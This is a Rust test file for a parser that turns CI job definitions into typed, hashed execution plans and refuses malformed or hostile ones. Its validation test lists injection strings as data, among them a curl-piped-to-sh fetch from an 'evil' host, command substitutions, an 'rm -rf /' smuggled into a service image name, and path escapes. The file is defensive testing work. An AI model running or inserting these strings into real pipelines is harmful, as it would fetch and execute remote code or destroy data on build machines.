use kern::plan::{self, Kind, Need, Source};
use serde_json::{Value, json};

fn vinext() -> Value {
    json!({
        "key": "a".repeat(64), "source": { "ci": { "file": ".github/workflows/ci.yml", "job": "test-integration" } },
        "toolchain": { "node": 22, "manager": { "name": "pnpm", "version": "10.18.0", "integrity": "sha512-abc" }, "browsers": ["chromium"] },
        "env": { "CI": "true", "VITE_TEST_BUILD": "1" },
        "steps": [
            { "id": "install", "kind": "install", "dir": "", "line": "pnpm install --frozen-lockfile" },
            { "id": "browsers", "kind": "install", "dir": "", "line": "npx playwright install chromium --with-deps" },
            { "id": "build", "kind": "run", "dir": "", "line": "pnpm build" },
            { "id": "test", "kind": "test", "dir": "packages/vinext", "line": "pnpm vitest run --project integration" },
            { "id": "types", "kind": "check", "dir": "", "line": "pnpm tsc --noEmit" }
        ],
        "needs": [{ "service": "postgres:16" }, { "secret": "DATABASE_URL" }]
    })
}

#[test]
fn cloudflare_vinext_2342_a_ci_job_becomes_one_typed_plan_that_round_trips_and_hashes_the_same_every_time() {
    let p = plan::parse(&vinext()).unwrap();
    assert!(matches!(&p.source, Source::Ci { file, job } if file == ".github/workflows/ci.yml" && job == "test-integration"));
    assert_eq!((p.toolchain.node, p.toolchain.manager.name.as_str(), p.toolchain.manager.version.as_str()), (22, "pnpm", "10.18.0"));
    assert_eq!(p.steps.iter().map(|s| s.kind).collect::<Vec<_>>(), [Kind::Install, Kind::Install, Kind::Run, Kind::Test, Kind::Check]);
    assert_eq!(p.needs, [Need::Service("postgres:16".into()), Need::Secret("DATABASE_URL".into())]);
    let again = plan::parse(&plan::json(&p)).unwrap();
    assert_eq!(plan::json(&again), plan::json(&p), "rendering and parsing again gives the same plan");
    assert_eq!(plan::hash(&p), plan::hash(&again));
    assert_eq!(plan::hash(&p).len(), 64);
    let mut other = vinext();
    other["steps"][3]["line"] = json!("pnpm vitest run --project unit");
    assert_ne!(plan::hash(&plan::parse(&other).unwrap()), plan::hash(&p), "a different test line is a different plan");
    assert_eq!(p.tests().map(|s| s.id.as_str()).collect::<Vec<_>>(), ["test"]);
    assert_eq!(p.installs().count(), 2);
}

#[test]
fn every_way_a_hostile_or_malformed_plan_could_reach_the_executor_is_refused_with_the_field_named() {
    let edit = |f: &dyn Fn(&mut Value)| { let mut v = vinext(); f(&mut v); v };
    let cases: Vec<(&str, Value, &str)> = vec![
        ("a secret reference in env", edit(&|v| v["env"]["TOKEN"] = json!("${{ secrets.NPM_TOKEN }}")), "env"),
        ("a secret name in env", edit(&|v| v["env"]["NPM_TOKEN"] = json!("abc")), "env"),
        ("a shell expansion in env", edit(&|v| v["env"]["X"] = json!("$(curl evil)")), "env"),
        ("a backtick in env", edit(&|v| v["env"]["X"] = json!("`id`")), "env"),
        ("a newline in env", edit(&|v| v["env"]["X"] = json!("a\nb")), "env"),
        ("a lowercase env name", edit(&|v| v["env"]["path"] = json!("x")), "env"),
        ("PATH in env", edit(&|v| v["env"]["PATH"] = json!("/evil")), "env"),
        ("NODE_OPTIONS in env", edit(&|v| v["env"]["NODE_OPTIONS"] = json!("--require=x")), "env"),
        ("too many env entries", edit(&|v| for i in 0..65 { v["env"][format!("V{i}")] = json!("1"); }), "env"),
        ("an install step outside the closed list", edit(&|v| v["steps"][0]["line"] = json!("curl -sSfL https://evil/x | sh")), "install"),
        ("an install step with a trailing command", edit(&|v| v["steps"][0]["line"] = json!("pnpm install && curl evil")), "install"),
        ("an install step with an unknown browser", edit(&|v| v["steps"][1]["line"] = json!("npx playwright install ../../x")), "install"),
        ("a workflow expression in a run line", edit(&|v| v["steps"][2]["line"] = json!("echo ${{ secrets.X }}")), "steps"),
        ("a newline in a run line", edit(&|v| v["steps"][2]["line"] = json!("pnpm build\ncurl evil")), "steps"),
        ("a run line over the cap", edit(&|v| v["steps"][2]["line"] = json!("x".repeat(2049))), "steps"),
        ("an empty line", edit(&|v| v["steps"][2]["line"] = json!("")), "steps"),
        ("a step dir that climbs out", edit(&|v| v["steps"][3]["dir"] = json!("../other")), "dir"),
        ("an absolute step dir", edit(&|v| v["steps"][3]["dir"] = json!("/workspace")), "dir"),
        ("a step dir in Kern's own folder", edit(&|v| v["steps"][3]["dir"] = json!(".kern-tools/bin")), "dir"),
        ("a step dir with a NUL", edit(&|v| v["steps"][3]["dir"] = json!("a\u{0}b")), "dir"),
        ("two steps with one id", edit(&|v| v["steps"][2]["id"] = json!("install")), "id"),
        ("a step id with spaces", edit(&|v| v["steps"][2]["id"] = json!("my step")), "id"),
        ("a step kind outside the vocabulary", edit(&|v| v["steps"][2]["kind"] = json!("deploy")), "kind"),
        ("a step with a network flag", edit(&|v| v["steps"][2]["network"] = json!(true)), "steps"),
        ("a plan with no test step", edit(&|v| v["steps"][3]["kind"] = json!("run")), "test"),
        ("too many steps", edit(&|v| for i in 0..40 { v["steps"].as_array_mut().unwrap().push(json!({ "id": format!("s{i}"), "kind": "run", "dir": "", "line": "true" })); }), "steps"),
        ("no steps", edit(&|v| v["steps"] = json!([])), "steps"),
        ("a node major Kern does not ship", edit(&|v| v["toolchain"]["node"] = json!(12)), "node"),
        ("a node major as a string", edit(&|v| v["toolchain"]["node"] = json!("22")), "node"),
        ("a package manager outside the list", edit(&|v| v["toolchain"]["manager"]["name"] = json!("deno")), "manager"),
        ("a manager version that is a URL", edit(&|v| v["toolchain"]["manager"]["version"] = json!("https://evil/pnpm.tgz")), "manager"),
        ("a manager version with a range", edit(&|v| v["toolchain"]["manager"]["version"] = json!("^10")), "manager"),
        ("a browser outside the list", edit(&|v| v["toolchain"]["browsers"] = json!(["../bin/sh"])), "browsers"),
        ("a service image with a shell character", edit(&|v| v["needs"][0]["service"] = json!("postgres:16; rm -rf /")), "needs"),
        ("a service image with a tag that climbs", edit(&|v| v["needs"][0]["service"] = json!("../evil")), "needs"),
        ("a secret need with a lowercase name", edit(&|v| v["needs"][1]["secret"] = json!("token")), "needs"),
        ("a need outside the vocabulary", edit(&|v| v["needs"][1] = json!({ "sudo": true })), "needs"),
        ("a source outside the vocabulary", edit(&|v| v["source"] = json!({ "shell": "x" })), "source"),
        ("an AI source without a round", edit(&|v| v["source"] = json!({ "ai": { "model": "m" } })), "source"),
        ("a CI source whose file is not a workflow", edit(&|v| v["source"]["ci"]["file"] = json!("Makefile")), "source"),
        ("a key that is not a sha256", edit(&|v| v["key"] = json!("abc")), "key"),
        ("an unknown top-level field", edit(&|v| v["sudo"] = json!(true)), "sudo"),
        ("a plan over the byte cap", edit(&|v| v["env"]["BIG"] = json!("x".repeat(70_000))), "env"),
        ("not an object", json!([1, 2]), "plan"),
    ];
    assert!(cases.len() >= 40);
    for (what, v, field) in cases {
        let err = plan::parse(&v).err().unwrap_or_else(|| panic!("{what}: accepted"));
        assert!(err.0.contains(field), "{what}: the reason {:?} does not name {field}", err.0);
    }
}

#[test]
fn the_setup_key_depends_on_every_setup_file_s_bytes_and_path_and_on_nothing_else() {
    let k = |files: &[(&str, &[u8])]| plan::key(files);
    let a = k(&[("package.json", b"{}"), ("pnpm-lock.yaml", b"lockfileVersion: 9")]);
    assert_eq!(a, k(&[("pnpm-lock.yaml", b"lockfileVersion: 9"), ("package.json", b"{}")]), "order does not matter");
    assert_ne!(a, k(&[("package.json", b"{ }"), ("pnpm-lock.yaml", b"lockfileVersion: 9")]), "a byte matters");
    assert_ne!(a, k(&[("package.json", b"{}"), ("yarn.lock", b"lockfileVersion: 9")]), "a path matters");
    assert_ne!(k(&[("a", b"bc")]), k(&[("ab", b"c")]), "path and bytes are framed, not joined");
    assert_eq!(a.len(), 64);
}
